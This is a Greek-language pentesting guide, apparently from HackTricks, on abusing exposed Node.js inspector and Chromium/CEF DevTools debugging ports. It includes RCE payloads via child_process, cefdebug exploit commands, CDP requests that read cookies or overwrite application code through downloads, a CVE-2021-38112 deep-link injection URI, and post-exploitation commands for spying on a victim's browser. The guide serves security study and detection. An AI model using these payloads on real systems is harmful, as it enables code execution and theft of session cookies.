# Κατάχρηση του Node inspector/CEF debug

{{#include ../../banners/hacktricks-training.md}}

Ιστορικά πρακτικά παραδείγματα περιλαμβάνουν το walkthrough του Multimaster και την επίθεση στον debugger του Visual Studio Code μέσω του CVE-2019-1414· χρησιμοποιήστε τα ως πλαίσιο ειδικό για τις αντίστοιχες εκδόσεις, αντί να θεωρείτε ότι κάθε σύγχρονος στόχος Electron ή Chromium εκθέτει τα ίδια primitives.<sup>[[1]](#references)[[3]](#references)</sup>

## Βασικές πληροφορίες

[Από την τεκμηρίωση](https://nodejs.org/learn/getting-started/debugging): Όταν ξεκινά με το switch `--inspect`, μια διεργασία Node.js ακούει για σύνδεση από debugging client. Από **προεπιλογή**, ακούει στη διεύθυνση host και στη θύρα **`127.0.0.1:9229`**. Σε κάθε διεργασία εκχωρείται επίσης ένα **μοναδικό** **UUID**.<sup>[[4]](#references)</sup>

Οι inspector clients πρέπει να γνωρίζουν και να ορίζουν τη διεύθυνση host, τη θύρα και το UUID για να συνδεθούν. Ένα πλήρες URL θα μοιάζει κάπως έτσι: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Επειδή ο **debugger έχει πλήρη πρόσβαση στο περιβάλλον εκτέλεσης του Node.js**, ένας κακόβουλος παράγοντας που μπορεί να συνδεθεί σε αυτήν τη θύρα ενδέχεται να μπορεί να εκτελέσει arbitrary code εκ μέρους της διεργασίας Node.js (**πιθανή κλιμάκωση προνομίων**).<sup>[[4]](#references)</sup>

Υπάρχουν διάφοροι τρόποι εκκίνησης ενός inspector:<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

Όταν ξεκινήσετε μια διεργασία υπό επιθεώρηση, θα εμφανιστεί κάτι σαν αυτό:<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

Οι διεργασίες που βασίζονται στο **CEF** (**Chromium Embedded Framework**) μπορούν να εκθέσουν ένα debugger με την επιλογή `--remote-debugging-port=9222`. Αυτό εκθέτει το πρόγραμμα περιήγησης μέσω του [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) και όχι μέσω ενός επιθεωρητή Node.js, επομένως τα payload που βασίζονται στο `process` του Node.js δεν εφαρμόζονται άμεσα από προεπιλογή.<sup>[[2]](#references)[[5]](#references)</sup>

Όταν ξεκινήσετε ένα πρόγραμμα περιήγησης σε λειτουργία debugging, θα εμφανιστεί κάτι σαν το εξής:<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### Απαρίθμηση και χειρισμός ενός CDP endpoint

Τα HTTP discovery endpoints διακρίνουν το WebSocket του **browser** από τα WebSocket μεμονωμένων **target** (tab, worker, extension κ.λπ.). Ζητήστε το `/json/version` για το endpoint του browser και το `/json/list` για τα target· στη συνέχεια, μπορείτε να χειριστείτε απευθείας τις τιμές `webSocketDebuggerUrl` που επιστρέφονται, χρησιμοποιώντας τα μηνύματα τύπου JSON-RPC του CDP.<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

Για παράδειγμα, συνδεθείτε με `websocat "$BROWSER_WS"` και στείλτε `{"id":1,"method":"Target.getTargets"}` ή `{"id":2,"method":"Storage.getCookies"}`. Σε ένα page target (`websocat "$PAGE_WS"`), το `Runtime.evaluate` εκτελείται σε εκείνον τον renderer και το `Page.captureScreenshot` επιστρέφει ένα screenshot κωδικοποιημένο σε base64. Το `document.cookie` δεν μπορεί να αποκαλύψει cookies `HttpOnly`, ενώ το `Storage.getCookies` ζητά από τον browser το cookie store του.<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### Browsers, WebSockets και same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Οι ιστότοποι που ανοίγουν σε ένα web-browser μπορούν να κάνουν αιτήματα WebSocket και HTTP σύμφωνα με το μοντέλο ασφαλείας του browser. Απαιτείται μια **αρχική σύνδεση HTTP** για να **αποκτηθεί ένα μοναδικό αναγνωριστικό συνεδρίας debugger**. Η **same-origin-policy** **εμποδίζει** τους ιστότοπους να κάνουν **αυτή τη σύνδεση HTTP**. Για πρόσθετη ασφάλεια έναντι [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** το Node.js επαληθεύει ότι οι **κεφαλίδες 'Host'** της σύνδεσης καθορίζουν είτε μια **διεύθυνση IP** είτε ακριβώς το **`localhost`**.<sup>[[4]](#references)</sup>

> [!TIP]
> Αυτά τα **μέτρα ασφαλείας εμποδίζουν την εκμετάλλευση του inspector** για την εκτέλεση κώδικα **απλώς με την αποστολή ενός αιτήματος HTTP** (κάτι που θα μπορούσε να γίνει με την εκμετάλλευση ενός SSRF vuln).<sup>[[4]](#references)</sup>

### Εκκίνηση του inspector σε διεργασίες που εκτελούνται

Μπορείτε να στείλετε το **σήμα SIGUSR1** σε μια διεργασία nodejs που εκτελείται, ώστε να **εκκινήσει τον inspector** στην προεπιλεγμένη θύρα. Ωστόσο, λάβετε υπόψη ότι χρειάζεστε επαρκή προνόμια, επομένως αυτό μπορεί να σας παραχωρήσει **προνομιακή πρόσβαση σε πληροφορίες μέσα στη διεργασία**, αλλά όχι άμεση κλιμάκωση προνομίων.<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> Αυτό είναι χρήσιμο σε containers, επειδή η **διακοπή της διεργασίας και η εκκίνηση μιας νέας** με `--inspect` **δεν αποτελεί επιλογή**, καθώς το **container** θα **τερματιστεί** μαζί με τη διεργασία.<sup>[[6]](#references)</sup>

### Σύνδεση στο inspector/debugger

Για να συνδεθείτε σε ένα **πρόγραμμα περιήγησης βασισμένο στο Chromium**, μπορείτε να αποκτήσετε πρόσβαση στις διευθύνσεις URL `chrome://inspect` ή `edge://inspect` για το Chrome ή το Edge, αντίστοιχα. Κάνοντας κλικ στο κουμπί Configure, πρέπει να βεβαιωθείτε ότι αναφέρονται σωστά ο **κεντρικός υπολογιστής και η θύρα προορισμού**. Η εικόνα δείχνει ένα παράδειγμα Remote Code Execution (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Αφού εμφανιστεί ένα URL για πρόσβαση στο debugger, π.χ. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Σύνδεση στο inspector/debugger: Για να συνδεθείτε σε ένα πρόγραμμα περιήγησης βασισμένο στο Chromium,...](<../../images/image (674).png>)

Μπορείτε να συνδεθείτε σε debugger/inspector χρησιμοποιώντας τη **γραμμή εντολών**:<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

Το εργαλείο [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) επιτρέπει τον εντοπισμό inspectors που εκτελούνται τοπικά και την έγχυση κώδικα σε αυτούς.<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> Σημειώστε ότι τα **NodeJS RCE exploits δεν θα λειτουργήσουν** αν συνδεθείτε σε browser μέσω του [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (πρέπει να ελέγξετε το API για να βρείτε ενδιαφέροντα πράγματα που μπορείτε να κάνετε με αυτό).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE in NodeJS Debugger/Inspector

> [!TIP]
> Αν ήρθατε εδώ αναζητώντας πώς να αποκτήσετε [**RCE από XSS στο Electron, δείτε αυτήν τη σελίδα.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Μερικοί συνηθισμένοι τρόποι απόκτησης **RCE** όταν μπορείτε να **συνδεθείτε** σε ένα Node **inspector** είναι να χρησιμοποιήσετε κάτι σαν τα παρακάτω (φαίνεται πως αυτό **δεν θα λειτουργήσει σε σύνδεση με το Chrome DevTools protocol**):<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Payloads του Chrome DevTools Protocol

Μπορείτε να δείτε το API εδώ: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
Σε αυτή την ενότητα θα παραθέσω απλώς ενδιαφέροντα πράγματα που έχω δει να χρησιμοποιούν για την εκμετάλλευση αυτού του protocol.

### Περιορισμός του προεπιλεγμένου profile από το Chrome 136 και μετά

Από το **Chrome 136**, το Chrome αγνοεί τα `--remote-debugging-port` και `--remote-debugging-pipe` όταν στοχεύουν τον **προεπιλεγμένο κατάλογο δεδομένων του Chrome**. Η παράμετρος πρέπει να συνδυάζεται με ένα μη τυπικό `--user-data-dir`, του οποίου το ξεχωριστό κλειδί κρυπτογράφησης και η απομονωμένη κατάσταση του browser εμποδίζουν την απλή τεχνική που βασίζεται σε flag να εκθέσει το κανονικό, πιστοποιημένο profile του χρήστη. Δεν πρέπει να θεωρείται δεδομένο ότι αυτός ο περιορισμός του Chrome καλύπτει παλαιότερες εκδόσεις του Chrome, το Chrome for Testing, εφαρμογές Electron/CEF ή άλλες παραλλαγές του Chromium, χωρίς προηγούμενη επαλήθευση.<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

Therefore, το γεγονός ότι βλέπουμε μια τρέχουσα διεργασία Chrome που εκκινήθηκε μόνο με `--remote-debugging-port` **δεν** αποδεικνύει ότι ενεργοποιήθηκε το CDP. Επιβεβαιώστε τον listener και το `/json/version`, και προσδιορίστε ποιο profile χρησιμοποιεί στην πραγματικότητα.<sup>[[14]](#references)</sup>

### Parameter Injection via Deep Links

Στο [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/), η Rhino Security ανακάλυψε ότι μια εφαρμογή βασισμένη στο CEF **καταχώρισε ένα προσαρμοσμένο URI** στο σύστημα (workspaces://index.html), το οποίο λάμβανε ολόκληρο το URI και στη συνέχεια **εκκινούσε την εφαρμογή που βασίζεται στο CEF** με μια διαμόρφωση που δημιουργούνταν εν μέρει από αυτό το URI.<sup>[[8]](#references)</sup>

Ανακαλύφθηκε ότι οι παράμετροι του URI αποκωδικοποιούνταν από URL και χρησιμοποιούνταν για την εκκίνηση της βασικής εφαρμογής CEF, επιτρέποντας σε έναν χρήστη να κάνει **inject** τη σημαία **`--gpu-launcher`** στη **γραμμή εντολών** και να εκτελέσει αυθαίρετες ενέργειες.<sup>[[8]](#references)</sup>

Έτσι, ένα payload όπως:

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

Θα εκτελέσει το calc.exe.<sup>[[8]](#references)</sup>

### Αντικατάσταση αρχείων

Αλλάξτε τον φάκελο όπου **θα αποθηκεύονται τα αρχεία που λαμβάνονται** και κατεβάστε ένα αρχείο για να **αντικαταστήσετε** τον συχνά χρησιμοποιούμενο **πηγαίο κώδικα** της εφαρμογής με τον **κακόβουλο κώδικά** σας.<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### Webdriver RCE και exfiltration

Η STAR Labs έδειξε ότι οι εκτεθειμένες υπηρεσίες WebDriver/CDP μπορούν να επιτρέψουν αυθαίρετες αναγνώσεις αρχείων και RCE· σε ορισμένες διαμορφώσεις, το DNS rebinding μπορεί να ολοκληρώσει την αλυσίδα exploit.<sup>[[9]](#references)</sup>

Η υπηρεσία WebDriver του ChromeDriver είναι διαφορετική από το Chrome DevTools/CDP. Η δυνατότητα [`goog:chromeOptions.binary`](https://developer.chrome.com/docs/chromedriver/capabilities) επιλέγει το εκτελέσιμο του browser που θα εκκινηθεί για μια νέα συνεδρία. Αν ένας μη προνομιούχος καλών μπορεί να αποκτήσει πρόσβαση σε μια υπηρεσία ChromeDriver που εκτελείται ως root και να υποβάλει συνεδρία με διαδρομή εκτελέσιμου που ελέγχει ο ίδιος, η εκκίνηση αυτή μπορεί να διασχίσει το όριο προνομίων της υπηρεσίας. Μια κενή απόκριση `/sessions` δεν αρκεί για να διαπιστωθεί αν μπορούν να δημιουργηθούν νέες συνεδρίες. Εξετάστε τον ιδιοκτήτη της διεργασίας, την πραγματική προσβασιμότητα του listener, την εξουσιοδότηση συνεδριών, την πρόσβαση στο εκτελέσιμο και τους περιορισμούς εκτέλεσης πριν συμπεράνετε ότι η διαδρομή είναι αξιοποιήσιμη· το όνομα μιας διεργασίας ή η συνήθης θύρα από μόνα τους δεν αρκούν. Οι [οδηγίες ασφαλείας της Google](https://developer.chrome.com/docs/chromedriver/security-considerations) συνιστούν την εκτέλεση του ChromeDriver με μη προνομιούχο λογαριασμό. Η παθητική απαρίθμηση δεν πρέπει να δημιουργεί συνεδρία WebDriver.

Για επιπλέον ιστορικές περιπτώσεις ασφάλειας browser automation και Chromium, δείτε την ανάλυση του Counter για το WebDriver και τα issues 773, 1742 και 1944 του Project Zero.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Ενεργοποίηση CDP μέσα σε ενεργή διεργασία Chromium

Στα Windows, το [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) έδειξε ότι ο περιορισμός της γραμμής εντολών δεν είναι ο μόνος τρόπος ενεργοποίησης του CDP: κώδικας που μπορεί ήδη να εγχυθεί σε υπάρχον `msedge.exe` μπορεί να καλέσει τη μη εξαγόμενη συνάρτηση `content::DevToolsAgentHost::StartRemoteDebuggingServer` του Chromium και να εκθέσει το ενεργό, πιστοποιημένο προφίλ χωρίς επανεκκίνηση του browser.<sup>[[15]](#references)</sup>

Η επίδειξη της αλυσίδας exploit εγχέει ένα DLL με `VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread`, επιλύει εσωτερικά σύμβολα του Edge (αρχικά από PDB και στη συνέχεια με υπογραφές byte συγκεκριμένες για κάθε έκδοση), υποκλάπτει το παράθυρο του browser και δημοσιεύει ένα μήνυμα, ώστε η τελική κλήση εκκίνησης του server να εκτελεστεί στο **UI thread** του browser. Το socket συνδέεται στο loopback, μετά το οποίο οι συνήθεις primitives του CDP μπορούν να ανακτήσουν cookies, να καταγράψουν καρτέλες, να επιθεωρήσουν την κίνηση δικτύου ή να εκτελέσουν JavaScript σε πιστοποιημένες σελίδες.<sup>[[15]](#references)</sup>

> [!WARNING]
> Πρόκειται για τεχνική **post-compromise/process-injection**, όχι για παράκαμψη δικτύου χωρίς πιστοποίηση. Εξαρτάται σε μεγάλο βαθμό από το build, επειδή τα σχετικά σύμβολα C++ δεν εξάγονται και οι υπογραφές μπορεί να αλλάξουν μετά από ενημερώσεις του browser.<sup>[[15]](#references)</sup>

Για τον εντοπισμό, μην βασίζεστε μόνο στην τηλεμετρία της γραμμής εντολών `--remote-debugging-*`: συσχετίστε επίσης ασυνήθιστα handles και λειτουργίες μνήμης έναντι διεργασιών browser (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, δημιουργία thread), έγχυση DLL και απροσδόκητα listening sockets loopback που ανήκουν σε Chrome/Edge.<sup>[[15]](#references)</sup>

### Post-Exploitation

Σε ένα πραγματικό περιβάλλον και **μετά την παραβίαση** ενός υπολογιστή χρήστη που χρησιμοποιεί browser βασισμένο στο Chromium, μια ιστορική τεχνική ήταν η επανεκκίνηση του browser με ενεργοποιημένο το debugging και η προώθηση της θύρας loopback. Αυτό μπορεί να εκθέσει την κατάσταση περιήγησης του θύματος σε προϊόντα/builds που εξακολουθούν να δέχονται το επιλεγμένο προφίλ, αλλά το Chrome 136+ δεν θα το επιτρέψει για τον προεπιλεγμένο κατάλογο δεδομένων του.<sup>[[7]](#references)[[14]](#references)</sup>

Η αρχική εντολή επανεκκίνησης διατηρείται παρακάτω για παλαιότερους στόχους ή στόχους συγκεκριμένων εκδόσεων. Η δεύτερη εντολή είναι η υποστηριζόμενη μορφή για το τρέχον Chrome, αλλά δημιουργεί ένα απομονωμένο προφίλ αντί να ανοίξει ξανά την κανονική πιστοποιημένη κατάσταση του θύματος.<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

Για relaunch, extension και CDP tradecraft ειδικά για macOS Chromium, δείτε [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - Εργαλείο επιθεώρησης και εκμετάλλευσης του CEF/Chromium debugger](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Remote Code Execution στο Visual Studio Code μέσω του Chrome DevTools Debugger](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Οδηγός debugging του Node.js - Ξεκινώντας](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Κατάχρηση της λειτουργίας debugging του Chrome για απομακρυσμένη παρακολούθηση και έλεγχο περιόδων περιήγησης](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: Remote Code Execution στο AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Μιλάς σε μένα; - WebDriver RCE μέσω DNS Rebinding και CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - Από bot σε RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Αλλαγές στις επιλογές remote debugging για βελτίωση της ασφάλειας - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [Εισαγωγή CDP σε ένα Edge Browser που εκτελείται: Μια εις βάθος ανάλυση της instrumentation ενός browser κατά την εκτέλεση](https://deathflamingo.com/blog/cdp_enabler/)
{{#include ../../banners/hacktricks-training.md}}
